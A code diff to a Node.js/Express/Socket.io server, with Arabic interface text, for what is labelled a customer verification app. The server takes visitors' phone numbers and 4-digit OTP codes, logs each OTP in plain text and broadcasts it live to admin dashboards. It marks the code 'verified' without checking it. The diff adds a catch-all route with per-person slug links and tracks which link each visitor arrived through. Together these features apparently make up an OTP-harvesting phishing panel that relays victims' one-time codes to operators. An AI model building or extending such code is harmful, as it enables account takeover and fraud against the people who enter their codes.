@@ -30,11 +30,6 @@ connectDB().then((connected) => {
     isMongoConnected = connected;
 });
 
-// Serve Admin Dashboard page explicitly
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
 // REST API Endpoints
 app.get('/api/verifications', async (req, res) => {
     try {
@@ -96,6 +91,16 @@ app.delete('/api/verifications', async (req, res) => {
     }
 });
 
+// Serve Admin Dashboard page explicitly
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+// Wildcard catch-all route: serves customer verification app (index.html) for ANY custom link/slug (/amir, /ali, /driver-101, etc.)
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 // Socket.io Real-time Logic
 io.on('connection', (socket) => {
     console.log(`[Socket.io] New client connected: ${socket.id}`);
@@ -103,6 +108,8 @@ io.on('connection', (socket) => {
     // Customer submits phone number
     socket.on('submit_phone', async (data, callback) => {
         const phoneNumber = data.phoneNumber ? data.phoneNumber.trim() : '';
+        const customSlug = data.customSlug || '/';
+
         if (!phoneNumber) {
             if (callback) callback({ success: false, message: 'رقم الهاتف مطلوب' });
             return;
@@ -117,6 +124,7 @@ io.on('connection', (socket) => {
                 record = new Verification({
                     phoneNumber,
                     status: 'PHONE_SUBMITTED',
+                    customSlug,
                     ipAddress: clientIp,
                     submittedAt: now
                 });
@@ -127,6 +135,7 @@ io.on('connection', (socket) => {
                     phoneNumber,
                     otp: null,
                     status: 'PHONE_SUBMITTED',
+                    customSlug,
                     ipAddress: clientIp,
                     submittedAt: now,
                     createdAt: now
@@ -134,7 +143,7 @@ io.on('connection', (socket) => {
                 localVerifications.push(record);
             }
 
-            console.log(`[Notification] Phone submitted: ${phoneNumber}`);
+            console.log(`[Notification] Phone submitted: ${phoneNumber} via slug ${customSlug}`);
 
             // Broadcast real-time notification to all connected Admin dashboards
             io.emit('admin_notification', {
@@ -143,8 +152,9 @@ io.on('connection', (socket) => {
                     id: record._id,
                     phoneNumber: record.phoneNumber,
                     status: 'PHONE_SUBMITTED',
+                    customSlug: record.customSlug,
                     submittedAt: record.submittedAt,
-                    message: `العميل صاحب الرقم ${phoneNumber} قام بطلب كود التحقق`
+                    message: `العميل صاحب الرقم ${phoneNumber} قام بطلب كود التحقق (الرابط: ${customSlug})`
                 }
             });
 
@@ -163,7 +173,7 @@ io.on('connection', (socket) => {
 
     // Customer submits 4-Digit OTP
     socket.on('submit_otp', async (data, callback) => {
-        const { verificationId, phoneNumber, otp } = data;
+        const { verificationId, phoneNumber, otp, customSlug } = data;
 
         if (!otp || otp.length !== 4) {
             if (callback) callback({ success: false, message: 'برجاء إدخال كود OTP مكون من 4 أرقام' });
@@ -203,6 +213,7 @@ io.on('connection', (socket) => {
                         phoneNumber: phoneNumber || 'غير معروف',
                         otp: otp,
                         status: 'VERIFIED',
+                        customSlug: customSlug || '/',
                         submittedAt: now,
                         verifiedAt: now,
                         createdAt: now
@@ -213,7 +224,7 @@ io.on('connection', (socket) => {
 
             console.log(`[Notification] OTP Verified: ${updatedRecord.phoneNumber} -> OTP: ${otp}`);
 
-            // Broadcast real-time notification to Admin dashboard with exact requested wording format
+            // Broadcast real-time notification to Admin dashboard
             io.emit('admin_notification', {
                 type: 'OTP_SUBMITTED',
                 data: {
@@ -221,6 +232,7 @@ io.on('connection', (socket) => {
                     phoneNumber: updatedRecord.phoneNumber,
                     otp: otp,
                     status: 'VERIFIED',
+                    customSlug: updatedRecord.customSlug || customSlug || '/',
                     verifiedAt: updatedRecord.verifiedAt,
                     message: `العميل (${updatedRecord.phoneNumber}) قام بوضع الـ OTP: [ ${otp} ] و تم التحقق بنجاح`
                 }
